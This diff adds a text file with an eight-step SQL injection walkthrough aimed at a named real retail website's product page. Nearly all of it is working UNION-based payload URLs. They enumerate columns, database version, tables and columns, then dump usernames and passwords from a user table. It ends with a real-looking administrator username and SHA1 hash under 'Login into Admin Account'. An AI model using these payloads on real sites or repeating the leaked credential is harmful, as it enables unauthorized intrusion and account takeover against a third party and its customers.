@@ -1,0 +1,29 @@
+===================================================================================================================
+Text2Hex: https://magictool.ai/tool/text-to-hex-converter/
+
+Step 1: Identify Vulnerable Parameters
+https://www.revel.com.hk/en/product.php?id=152&pid=61'
+
+Step 2: Find the Number of Columns
+https://www.revel.com.hk/en/product.php?id=152&pid=61+ORDER+BY+20--+-
+
+Step 3: Find Displayed Columns
+https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-
+
+Step 4: Extract Database Information
+https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,@@version,17,database(),19,20--+-
+https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,user(),17,database(),19,20--+-
+
+Step 5: Extract Tables
+https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,CONVERT(GROUP_CONCAT(table_name)+USING utf8mb4),17,18,19,20+FROM+information_schema.tables+WHERE+table_schema=database()--+-             
+
+Step 6: Extract Columns from a Table
+https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,CONVERT(GROUP_CONCAT(column_name)+USING utf8mb4),17,18,19,20+FROM+information_schema.columns+WHERE+table_name=0x757372--+-   
+
+Step 7: Extract Data from the Table
+https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,CONVERT(GROUP_CONCAT(usr_name,0x3a,usr_pwd)+USING utf8mb4),17,18,19,20+FROM+usr--+-
+
+Step 8: Login into Admin Account
+Administrator:afbf4681fe8c7352b21c09187b4be6a09574afdb - Possible algorithms: SHA1 
+
+===================================================================================================================
